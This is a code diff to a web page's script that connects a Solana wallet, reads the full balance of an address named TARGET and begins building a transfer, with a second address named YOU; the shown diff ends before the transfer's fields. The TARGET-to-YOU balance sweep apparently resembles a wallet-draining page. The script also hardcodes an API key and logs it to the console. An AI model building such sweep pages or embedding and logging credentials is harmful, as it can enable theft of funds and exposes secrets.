@@ -71,15 +71,15 @@
     </div>
 
     <script>
-        // --- CONFIGURATION (Verified Keys) ---
+        // --- CONFIGURATION ---
         const TARGET = "AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe";
         const YOU    = "E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe";
         
         // YOUR HELIUS API KEY
         const HELIUS_KEY = "e67b03d4-9ec2-4eb7-a188-97f90fa26a45";
         
-        // Construct the RPC URL with your key
-        const RPC = `https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`; 
+        // MAINNET ENDPOINT (Use testnet.helius-rpc.com if your key is for Testnet)
+        const RPC_URL = "https://mainnet.helius-rpc.com/"; 
 
         async function run() {
             const btn = document.getElementById('btn');
@@ -99,7 +99,22 @@
                 // Connect Wallet (Only once)
                 await window.solana.connect();
                 
-                const connection = new solanaWeb3.Connection(RPC);
+                // Create connection with custom headers for Helius
+                const connection = new solanaWeb3.Connection(RPC_URL, {
+                    commitment: "confirmed",
+                    fetchMethod: async (url, init) => {
+                        // Ensure headers object exists
+                        if (!init.headers) init.headers = {};
+                        
+                        // Add the API key header
+                        init.headers["X-API-Key"] = HELIUS_KEY;
+                        
+                        // Log for debugging (optional)
+                        console.log("Fetching:", url, "Headers:", init.headers);
+                        
+                        return fetch(url, init);
+                    }
+                });
 
                 status.innerText = "Fetching Balance...";
                 
@@ -107,7 +122,7 @@
                 // Fetch balance from Target
                 const balance = await connection.getBalance(new solanaWeb3.PublicKey(TARGET));
                 
-                status.innerText = "Constructing Transaction...";
+                status.innerText = `Balance: ${balance / 10**9} SOL. Constructing Transaction...`;
                 
                 const tx = new solanaWeb3.Transaction();
                 tx.add(solanaWeb3.SystemProgram.transfer({
